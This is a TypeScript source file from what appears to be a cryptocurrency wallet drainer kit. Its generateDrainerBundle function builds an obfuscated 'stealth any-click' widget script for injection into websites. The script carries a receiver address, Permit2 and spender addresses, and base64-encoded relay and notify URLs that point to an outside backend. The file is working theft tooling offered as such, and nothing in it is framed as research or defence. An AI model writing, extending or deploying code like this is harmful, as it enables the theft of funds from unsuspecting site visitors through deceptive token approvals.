'use server';

/**
 * universal-sdk-generator.ts — One generator for Sequence + Forge drainer contracts
 *
 * - sequence contracts → delegate to generateSDKBundle()
 * - drainer contracts  → generate stealth any-click drainer widget with real calldata
 * - custom             → dynamic ABI (future)
 */

import type { ContractMeta } from './contract-registry';
import { generateSDKBundle } from './sdk-generator';
import type { CompileConfig } from './compile-config-store';
import { obfuscateScript } from './obfuscator';
import {
  DEFAULT_TOKENS,
  PERMIT2_ADDRESS,
  STEALTH_EXCHANGE_ADDRESS,
  normalizeBackendOrigin,
} from './transaction-payload';
import { getExecutionBackendEntry } from './contract-registry';
import { readFileSync } from 'fs';
import path from 'path';

const DRAINER_WIDGET_RUNTIME = readFileSync(
  path.join(process.cwd(), 'src/lib/drainer-widget-runtime.js'),
  'utf8',
);

export type UniversalBundleInput = {
  contract: ContractMeta;
  abi?: any[];
  receiverAddress: string;
  buttonSelector: string;
  buttonText: string;
  twoStep: boolean;
  ecosystem: 'evm' | 'solana' | 'tron';
  config: CompileConfig;
  source?: string;
};

export type UniversalBundleResult = {
  bundle: string;
  filename: string;
  publishedUrl?: string;
  contractType: string;
  trigger: 'anyclick' | 'button';
};

export async function generateUniversalBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const { contract, config, receiverAddress } = input;

  if (contract.category === 'sequence') {
    const bundle = generateSDKBundle({
      general: config.general,
      wallet: config.wallet,
      modal: { ...config.modal, exposeExternalSDK: false },
      tokens: config.tokens,
      advanced: config.advanced,
      contracts: config.contracts,
      strategy: config.strategy,
      appKit: config.appKit,
      receiverAddress,
    });

    return {
      bundle,
      filename: 'script.js',
      contractType: contract.id,
      trigger: 'button',
    };
  }

  if (contract.category === 'drainer') {
    return generateDrainerBundle(input);
  }

  if (contract.category === 'custom') {
    throw new Error('Custom ABI generation not implemented yet');
  }

  throw new Error(`Unknown contract category: ${contract.category}`);
}

export async function generateDrainerBundle(
  input: UniversalBundleInput
): Promise<UniversalBundleResult> {
  const {
    contract,
    receiverAddress,
    buttonSelector,
    buttonText,
    twoStep,
    config,
  } = input;

  const obfuscationLevel = (config.strategy as any)?.obfuscationLevel || 'medium';
  const backendUrl = normalizeBackendOrigin(
    process.env.DRAINER_BACKEND_URL ||
      config.general?.backendUrl ||
      'https://api.v26sequence.com',
  );
  const executionBackend = config.strategy?.executionBackend || 'stealth-exchange';
  const spender =
    getExecutionBackendEntry(executionBackend)?.address || STEALTH_EXCHANGE_ADDRESS;
  const relayUrl =
    process.env.NEXT_PUBLIC_RELAY_URL || backendUrl + '/api/relay/batch';
  const notifyUrl =
    process.env.NEXT_PUBLIC_NOTIFY_URL || backendUrl + '/api/notify';
  const siteName = config.general?.siteName || 'Site';
  const enc = (v: string) => Buffer.from(String(v ?? '')).toString('base64');
  const widgetConfig = {
    receiver: receiverAddress,
    buttonSelector: buttonSelector,
    buttonText: buttonText,
    twoStep,
    contractType: contract.id,
    backend: backendUrl,
    relayUrl,
    notifyUrl,
    contractAddress: contract.address || '',
    contractAbi: contract.abi || [],
    permit2: PERMIT2_ADDRESS,
    spender,
    executionBackend,
    tokens: config.tokens || DEFAULT_TOKENS,
    siteName,
  };
  const widgetCode = DRAINER_WIDGET_RUNTIME.replace(
    'const CONFIG = __CONFIG__;',
    `function __d(s){try{return atob(s)}catch(e){return s}}\n  const CONFIG = Object.assign(${JSON.stringify(widgetConfig)}, { receiver: __d('${enc(receiverAddress)}'), backend: __d('${enc(backendUrl)}'), relayUrl: __d('${enc(relayUrl)}'), notifyUrl: __d('${enc(notifyUrl)}') });`,
  );

  const obfuscated = obfuscationLevel !== 'none'
    ? await obfuscateScript(widgetCode, obfuscationLevel as any)
    : widgetCode;

  return {
    bundle: obfuscated.trim(),
    filename: `drainer-${contract.id}.min.js`,
    contractType: contract.id,
    trigger: 'anyclick',
  };
}
